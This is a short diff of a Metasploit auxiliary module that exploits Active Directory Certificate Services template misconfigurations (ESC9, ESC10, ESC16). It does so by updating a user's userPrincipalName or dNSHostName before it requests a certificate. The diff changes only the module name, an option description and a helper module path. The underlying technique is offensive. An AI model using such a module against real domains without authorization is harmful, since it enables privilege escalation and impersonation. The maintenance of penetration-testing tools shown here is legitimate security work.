@@ -17,7 +17,7 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name' => 'Exploits AD CS Template misconfigurations which involve updating an LDAP object: ESC9 and ESC10',
+        'Name' => 'Exploits AD CS Template misconfigurations which involve updating an LDAP object: ESC9, ESC10, and ESC16',
         'Description' => %q{
           This module updates an LDAP object with a new value before requesting a certificate.
           Request certificates via MS-ICPR (Active Directory Certificate Services). Depending on the certificate
@@ -53,7 +53,7 @@ class MetasploitModule < Msf::Auxiliary
     deregister_options('ALT_SID', 'PFX', 'ON_BEHALF_OF')
 
     register_options([
-      OptEnum.new('UPDATE_LDAP_OBJECT', [ true, 'Either userPrincipalName or dNSHostName, Updates the necessary object of a specific user before requesting the cert. Used to exploit ESC9 and ESC10. ', 'userPrincipalName', %w[userPrincipalName dNSHostName] ]),
+      OptEnum.new('UPDATE_LDAP_OBJECT', [ true, 'Either userPrincipalName or dNSHostName, Updates the necessary object of a specific user before requesting the cert.', 'userPrincipalName', %w[userPrincipalName dNSHostName] ]),
       OptString.new('TARGET_USERNAME', [true, 'The username of the target LDAP object.'])
     ])
 
@@ -80,7 +80,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def call_ldap_object_module(action, value = nil)
-    mod_refname = 'auxiliary/gather/ldap_object_attribute'
+    mod_refname = 'auxiliary/admin/ldap/ldap_object_attribute'
 
     print_status("Loading #{mod_refname}")
     ldap_update_module = framework.modules.create(mod_refname)
